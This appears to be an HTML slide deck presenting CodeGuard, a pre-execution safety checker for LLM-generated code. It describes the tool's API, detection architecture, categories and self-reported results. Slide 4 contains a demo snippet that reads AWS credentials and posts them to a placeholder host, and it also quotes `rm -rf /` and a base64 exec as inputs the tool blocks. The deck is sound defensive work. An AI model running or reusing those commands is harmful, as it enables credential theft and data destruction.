@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CodeGuard — Presentation</title>
+<style>
+  :root {
+    --bg: #0d1117; --panel: #161b22; --border: #30363d; --text: #c9d1d9;
+    --dim: #8b949e; --green: #3fb950; --red: #f85149; --blue: #58a6ff; --amber: #d29922;
+    --mono: 'Cascadia Code', Consolas, 'SFMono-Regular', Menlo, monospace;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    background: var(--bg); color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    overflow: hidden;
+  }
+  .deck { height: 100vh; display: flex; flex-direction: column; }
+  .slide {
+    flex: 1; display: none; flex-direction: column; justify-content: center;
+    padding: 6vh 8vw; max-width: 1200px; margin: 0 auto; width: 100%;
+  }
+  .slide.active { display: flex; animation: fade .18s ease-in; }
+  @keyframes fade { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+  h1 { font-size: 3.4rem; line-height: 1.1; margin-bottom: .6rem; }
+  h2 { font-size: 2rem; margin-bottom: 1.2rem; color: #fff; }
+  h2 .num { color: var(--dim); font-weight: 400; margin-right: .6rem; }
+  p.lead { font-size: 1.25rem; color: var(--dim); margin-bottom: 1rem; }
+  ul { list-style: none; }
+  li { font-size: 1.25rem; margin: .55rem 0; padding-left: 1.6rem; position: relative; }
+  li::before { content: "▸"; position: absolute; left: 0; color: var(--green); }
+  li.dim::before { color: var(--dim); }
+  code, pre { font-family: var(--mono); }
+  code { background: #010409; border: 1px solid var(--border); border-radius: 4px; padding: .1rem .35rem; font-size: .9em; }
+  pre {
+    background: #010409; border: 1px solid var(--border); border-radius: 8px;
+    padding: 1rem 1.2rem; font-size: .95rem; line-height: 1.5; overflow: auto; margin: .8rem 0;
+    white-space: pre-wrap;
+  }
+  .row { display: flex; gap: 2rem; flex-wrap: wrap; align-items: flex-start; }
+  .col { flex: 1; min-width: 280px; }
+  .card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.2rem; }
+  .tag { display: inline-block; font-size: .8rem; padding: .15rem .5rem; border-radius: 999px; border: 1px solid var(--border); color: var(--dim); }
+  .tag.live { color: var(--green); border-color: var(--green); }
+  .ok { color: var(--green); font-weight: 700; }
+  .bad { color: var(--red); font-weight: 700; }
+  .hi { color: var(--blue); }
+  table { width: 100%; border-collapse: collapse; font-size: 1.1rem; margin-top: .5rem; }
+  th, td { text-align: left; padding: .6rem .8rem; border-bottom: 1px solid var(--border); }
+  th { color: var(--dim); font-size: .85rem; text-transform: uppercase; letter-spacing: .05em; }
+  .chips { display: flex; flex-wrap: wrap; gap: .5rem; margin-top: .6rem; }
+  .chip { font-size: .85rem; padding: .25rem .6rem; border-radius: 999px; background: #388bfd26; color: var(--blue); border: 1px solid #388bfd66; }
+  .footer {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: .6rem 1.2rem; border-top: 1px solid var(--border); background: var(--panel);
+    font-size: .8rem; color: var(--dim);
+  }
+  .footer a { color: var(--blue); text-decoration: none; }
+  .bar { height: 3px; background: var(--border); }
+  .bar > i { display: block; height: 100%; width: 0; background: var(--green); transition: width .2s; }
+  .kbd { font-family: var(--mono); font-size: .75rem; border: 1px solid var(--border); border-radius: 4px; padding: 0 .3rem; }
+</style>
+</head>
+<body>
+<div class="deck">
+
+  <!-- 1 -->
+  <section class="slide active">
+    <span class="tag live">● LIVE · codeguard-bdmu.onrender.com</span>
+    <h1 style="margin-top:1rem">CodeGuard</h1>
+    <p class="lead">Real-time, <strong>pre-execution</strong> safety for LLM-generated code.</p>
+    <ul>
+      <li>CPU-only · <strong>no LLM calls anywhere</strong> · fail-closed</li>
+      <li>One call: <code>POST /check {"code": "..."}</code> → verdict <em>before it runs</em></li>
+      <li>Dashboard <a href="https://codeguard-bdmu.onrender.com/ui/" style="color:var(--blue)">/ui/</a> · API <code>codeguard-bdmu.onrender.com/check</code></li>
+    </ul>
+  </section>
+
+  <!-- 2 -->
+  <section class="slide">
+    <h2><span class="num">02</span>The problem</h2>
+    <ul>
+      <li>AI agents now <strong>write and execute</strong> code autonomously</li>
+      <li>Existing scanners are <strong>batch / CI</strong> tools — too slow to sit inline</li>
+      <li>The task: a fast, local <strong>checkpoint</strong> for every snippet</li>
+      <li class="dim">No LLM-as-judge · CPU-only · fixed schema · a <strong>live</strong> endpoint</li>
+    </ul>
+    <p class="lead" style="margin-top:1.2rem">The gap isn't detection quality — it's <strong>timing</strong>.</p>
+  </section>
+
+  <!-- 3 -->
+  <section class="slide">
+    <h2><span class="num">03</span>What CodeGuard is</h2>
+    <pre>POST /check  {"code": "..."}
+
+{
+  "verdict":         "block" | "allow",
+  "risk_score":      0.0 – 1.0,
+  "categories":      [ 9 fixed strings ],
+  "code_language":   "python" | "bash" | "javascript" | "sql" | "yaml" | "markdown" | "unknown",
+  "reason":          "human-readable, secrets masked",
+  "vulnerable_lines":[ 1-based ints ]
+}</pre>
+    <ul>
+      <li><code>block</code> ⟺ categories non-empty ⟺ <code>risk_score ≥ 0.5</code> — one invariant, one function</li>
+      <li><strong>Never</strong> 4xx/5xx on <code>/check</code>; malformed input → valid <code>allow</code></li>
+    </ul>
+  </section>
+
+  <!-- 4 -->
+  <section class="slide">
+    <h2><span class="num">04</span>Live demo <span class="tag live">on the deployed URL</span></h2>
+    <div class="row">
+      <div class="col">
+        <div class="card">
+          <div class="bad">✕ BLOCK</div>
+          <pre style="margin:.5rem 0 0">import os, requests
+creds = open(os.path.expanduser(
+    '~/.aws/credentials')).read()
+requests.post('http://example.invalid/collect',
+    data=creds)</pre>
+          <div class="chips">
+            <span class="chip">secret_access</span>
+            <span class="chip">data_exfiltration</span>
+            <span class="chip">lines 2–3</span>
+          </div>
+        </div>
+      </div>
+      <div class="col">
+        <div class="card">
+          <div class="ok">✓ ALLOW</div>
+          <pre style="margin:.5rem 0 0">import sqlite3
+conn.execute(
+  'DELETE FROM orders WHERE id = ?',
+  (order_id,))</pre>
+          <div style="color:var(--dim);font-size:.9rem">the hard part: benign lookalike</div>
+        </div>
+      </div>
+    </div>
+    <ul style="margin-top:1rem">
+      <li><code>rm -rf /</code> → <span class="bad">BLOCK</span> destructive_command (bash)</li>
+      <li><code>exec(base64.b64decode(...))</code> → <span class="bad">BLOCK</span> obfuscated_execution</li>
+      <li><strong>Deep analysis</strong> → evidence · scores · timings &nbsp;|&nbsp; <strong>Interception tab</strong> → PASS</li>
+    </ul>
+  </section>
+
+  <!-- 5 -->
+  <section class="slide">
+    <h2><span class="num">05</span>Architecture</h2>
+    <pre>preprocess → langid → segment → deobfuscate → parse
+          → detectors (+ benign dampers)
+          → ML (calibrated backup) → fusion → explain → finalize_response()
+          → JSON</pre>
+    <ul>
+      <li>Rules encode <strong>attack stories</strong>: sensitive source → processing → network sink (MITRE-tagged)</li>
+      <li><strong>Benign dampers</strong> suppress lookalikes (parameterized SQL, <code>ast.literal_eval</code>, docstrings, allowlisted hosts)</li>
+      <li><strong>Layered deobfuscation</strong> — base64/hex/chr/concat/alias/rot13/shell, with line maps</li>
+      <li>ML is a <strong>calibrated backup</strong>, not the judge</li>
+    </ul>
+  </section>
+
+  <!-- 6 -->
+  <section class="slide">
+    <h2><span class="num">06</span>The nine categories</h2>
+    <div class="chips">
+      <span class="chip">secret_access</span><span class="chip">data_exfiltration</span>
+      <span class="chip">destructive_command</span><span class="chip">obfuscated_execution</span>
+      <span class="chip">persistence_or_privesc</span><span class="chip">resource_exhaustion</span>
+      <span class="chip">ssrf_network_exfil</span><span class="chip">ai_targeted_instructions</span>
+      <span class="chip">dependency_risk</span>
+    </div>
+    <ul style="margin-top:1rem">
+      <li>Across <strong>Python, Bash, JavaScript, SQL, YAML, Markdown</strong></li>
+      <li>Includes <strong>AI-targeted prompt injection</strong> in comments, strings, docstrings and CI workflows</li>
+    </ul>
+  </section>
+
+  <!-- 7 -->
+  <section class="slide">
+    <h2><span class="num">07</span>Guarantees — why it's deployable</h2>
+    <ul>
+      <li><strong>Schema invariant</strong> enforced in one function — <code>/check</code> always HTTP 200</li>
+      <li><strong>Fail-closed</strong>: any error or timeout → a valid <code>block</code></li>
+      <li><strong>Never hangs</strong>: 2 s hard timeout + bounded regexes + input/line caps</li>
+      <li><strong>Deterministic</strong>; model loaded once at startup; missing model → rules-only</li>
+    </ul>
+    <p class="lead" style="margin-top:1rem">For a judged endpoint, <strong>availability is a feature</strong>.</p>
+  </section>
+
+  <!-- 8 -->
+  <section class="slide">
+    <h2><span class="num">08</span>Results</h2>
+    <table>
+      <tr><th>Metric</th><th>Dev sample (42)</th><th>Held-out (family split)</th></tr>
+      <tr><td>Precision / Recall / F1</td><td><strong>1.000 / 1.000 / 1.000</strong></td><td>1.000 / 0.984 / <strong>0.992</strong></td></tr>
+      <tr><td>False positives</td><td><strong>0</strong></td><td><strong>0</strong></td></tr>
+      <tr><td>FPR</td><td>0.000</td><td>0.000</td></tr>
+      <tr><td>Adversarial survival</td><td>—</td><td><strong>0.983</strong></td></tr>
+      <tr><td>Latency p50 / p95</td><td colspan="2">17 ms / 24 ms (typical &lt; 5 KB)</td></tr>
+      <tr><td>Model / footprint</td><td colspan="2">3.2 MB · ~180 MB RSS · no GPU</td></tr>
+    </table>
+  </section>
+
+  <!-- 9 -->
+  <section class="slide">
+    <h2><span class="num">09</span>Key design decisions</h2>
+    <ul>
+      <li><strong>Dampers &gt; detectors</strong> for the score — all benign lookalikes explicitly suppressed</li>
+      <li><strong>Multi-label, top-k</strong> categories (dev labels are fuzzy &amp; co-firing)</li>
+      <li><strong>Rules carry the verdict</strong> (ablation); ML is a calibrated backup</li>
+      <li><strong>No hard-coded answers</strong> — rules encode stories; model trains on generated templates</li>
+      <li><strong>Interception proven</strong> with an observable side effect (marker file)</li>
+    </ul>
+  </section>
+
+  <!-- 10 -->
+  <section class="slide">
+    <h2><span class="num">10</span>Limitations &amp; roadmap</h2>
+    <ul>
+      <li class="dim">Heuristic language ID; taint is intra-snippet; deobfuscation is bounded</li>
+      <li class="dim">Two per-category F1s dip on the stress set due to label co-firing (verdict unaffected)</li>
+      <li>Next: inter-procedural taint · ONNX cascade · grow the template bank from new evasions</li>
+    </ul>
+  </section>
+
+  <!-- 11 -->
+  <section class="slide">
+    <h2><span class="num">11</span>Close</h2>
+    <ul>
+      <li>Repo <a href="https://github.com/shreyash-2006/CodeGuard" style="color:var(--blue)">github.com/shreyash-2006/CodeGuard</a> (MIT) · deliverables in <code>/deliverables</code></li>
+      <li>Live <a href="https://codeguard-bdmu.onrender.com/ui/" style="color:var(--blue)">codeguard-bdmu.onrender.com</a> · judge endpoint <code>/check</code></li>
+    </ul>
+    <p class="lead" style="margin-top:1.2rem">Fast enough to be inline · reliable enough to be trusted · honest about its limits.</p>
+    <p style="color:var(--dim);margin-top:1rem">Questions?</p>
+  </section>
+
+  <div class="bar"><i id="bar"></i></div>
+  <div class="footer">
+    <span>CodeGuard — pre-execution code safety</span>
+    <span><span class="kbd">←</span> <span class="kbd">→</span> navigate · <span class="kbd">F</span> fullscreen · <span id="pos">1 / 11</span></span>
+  </div>
+</div>
+
+<script>
+  const slides = [...document.querySelectorAll('.slide')];
+  let i = Math.min(slides.length - 1, Math.max(0, (parseInt(location.hash.slice(1), 10) || 1) - 1));
+  function show(n) {
+    i = Math.max(0, Math.min(slides.length - 1, n));
+    slides.forEach((s, k) => s.classList.toggle('active', k === i));
+    document.getElementById('pos').textContent = (i + 1) + ' / ' + slides.length;
+    document.getElementById('bar').style.width = ((i + 1) / slides.length * 100) + '%';
+    history.replaceState(null, '', '#' + (i + 1));
+  }
+  addEventListener('keydown', (e) => {
+    if (['ArrowRight', 'ArrowDown', 'PageDown', ' ', 'Enter'].includes(e.key)) { e.preventDefault(); show(i + 1); }
+    else if (['ArrowLeft', 'ArrowUp', 'PageUp', 'Backspace'].includes(e.key)) { e.preventDefault(); show(i - 1); }
+    else if (e.key === 'Home') show(0);
+    else if (e.key === 'End') show(slides.length - 1);
+    else if (e.key === 'f' || e.key === 'F') {
+      document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();
+    }
+  });
+  addEventListener('click', (e) => { if (!e.target.closest('a')) show(i + 1); });
+  show(i);
+</script>
+</body>
+</html>
